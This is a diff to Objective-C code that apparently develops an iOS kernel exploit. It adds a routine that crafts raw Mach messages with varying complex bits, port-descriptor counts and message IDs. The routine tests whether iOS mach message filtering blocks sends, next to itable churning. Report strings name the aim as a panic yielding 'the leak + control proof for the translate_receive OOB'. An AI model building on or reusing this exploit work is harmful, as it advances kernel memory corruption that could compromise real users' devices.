@@ -122,6 +122,50 @@
     }
 }
 
+#pragma mark - Diagnostics: which message shape is rejected
+
+- (NSDictionary *)sendShape:(NSString *)shape
+                  complexBit:(BOOL)complex
+              descriptorCount:(uint32_t)count
+                    msghID:(int32_t)msgID
+                        port:(mach_port_t)port
+                  sendRight:(mach_port_t)sendRight {
+    NSMutableDictionary *result = [NSMutableDictionary dictionary];
+    size_t descSize = sizeof(mach_msg_port_descriptor_t);
+    size_t descBytes = complex ? (size_t)count * descSize : 0;
+    size_t total = sizeof(mach_msg_header_t) + (complex ? sizeof(mach_msg_body_t) : 0) + descBytes;
+    uint8_t *buf = calloc(1, total);
+    if (!buf) {
+        result[@"status"] = @"CALLOC_FAILED";
+        return result;
+    }
+    mach_msg_header_t *hdr = (mach_msg_header_t *)buf;
+    hdr->msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, 0) | (complex ? MACH_MSGH_BITS_COMPLEX : 0);
+    hdr->msgh_size = (mach_msg_size_t)total;
+    hdr->msgh_remote_port = port;
+    hdr->msgh_local_port = MACH_PORT_NULL;
+    hdr->msgh_id = msgID;
+    if (complex) {
+        mach_msg_body_t *body = (mach_msg_body_t *)(buf + sizeof(mach_msg_header_t));
+        body->msgh_descriptor_count = count;
+        uint8_t *descBase = buf + sizeof(mach_msg_header_t) + sizeof(mach_msg_body_t);
+        for (uint32_t i = 0; i < count; i++) {
+            mach_msg_port_descriptor_t *pd = (mach_msg_port_descriptor_t *)(descBase + i * descSize);
+            pd->name = sendRight;
+            pd->disposition = MACH_MSG_TYPE_COPY_SEND;
+            pd->type = MACH_MSG_PORT_DESCRIPTOR;
+        }
+    }
+    kern_return_t kr = mach_msg((mach_msg_header_t *)buf, MACH_SEND_MSG,
+                                0, (mach_msg_size_t)total, port, 1, MACH_PORT_NULL);
+    result[@"shape"] = shape;
+    result[@"size"] = @(total);
+    result[@"desc_size"] = @(descSize);
+    result[@"send_kr"] = @(kr);
+    free(buf);
+    return result;
+}
+
 #pragma mark - Report
 
 - (NSString *)runReport {
@@ -148,6 +192,20 @@
     NSMutableArray *held = [NSMutableArray array];
     [self churnItableWithPorts:held count:512];
     [self journal:[NSString stringWithFormat:@"CHURN_BASE held=%d", (int)held.count]];
+
+    [report appendString:@"\n--- diagnostic matrix (why does send fail?) ---\n"];
+    // 0x10000408 on every send: either descriptor layout or iOS mach message
+    // filtering (MACH_SEND_MSG_FILTERED). The matrix isolates the cause.
+    NSDictionary *d1 = [self sendShape:@"simple" complexBit:NO descriptorCount:0 msghID:0 port:port sendRight:port];
+    [report appendFormat:@"%@\n", d1];
+    NSDictionary *d2 = [self sendShape:@"complex0-id0" complexBit:YES descriptorCount:0 msghID:0 port:port sendRight:port];
+    [report appendFormat:@"%@\n", d2];
+    NSDictionary *d3 = [self sendShape:@"complex1-id0" complexBit:YES descriptorCount:1 msghID:0 port:port sendRight:port];
+    [report appendFormat:@"%@\n", d3];
+    NSDictionary *d4 = [self sendShape:@"complex1-id4b50" complexBit:YES descriptorCount:1 msghID:0x4b50 port:port sendRight:port];
+    [report appendFormat:@"%@\n", d4];
+    NSDictionary *d5 = [self sendShape:@"complex1-id1" complexBit:YES descriptorCount:1 msghID:1 port:port sendRight:port];
+    [report appendFormat:@"%@\n", d5];
 
     [report appendString:@"\n--- descriptor-count sweep (send+recv) ---\n"];
     uint32_t counts[] = {1, 2, 4, 8, 16, 32, 64, 128};
@@ -176,11 +234,13 @@
 
     [report appendString:@"\nVERDICT: SEE_JOURNAL\n"];
     [report appendString:
-     @"Survived with recv_kr=0 everywhere = the send path validated everything\n"
-     @"and the receive translation never saw a bad index; the boundary angle\n"
-     @"may need a real cross-process message (a mach service that accepts port\n"
-     @"descriptors) or a tighter itable-window race.\n"
-     @"Panic = pull the log; far = base+16*index is the leak + control proof.\n"];
+     @"Matrix reading:\n"
+     @"  simple=0, complex fails    -> descriptor layout/filter is the cause\n"
+     @"  complex0-id0 fails too     -> COMPLEX bit itself is filtered\n"
+     @"  id0 works, id4b50 fails    -> msgh_id filtering (iOS mach message filter)\n"
+     @"  everything works           -> the earlier failure was the 16B stride\n"
+     @"A panic anywhere = pull the log; far = base+16*index is the leak + control\n"
+     @"proof for the translate_receive OOB.\n"];
     return report;
 }
 
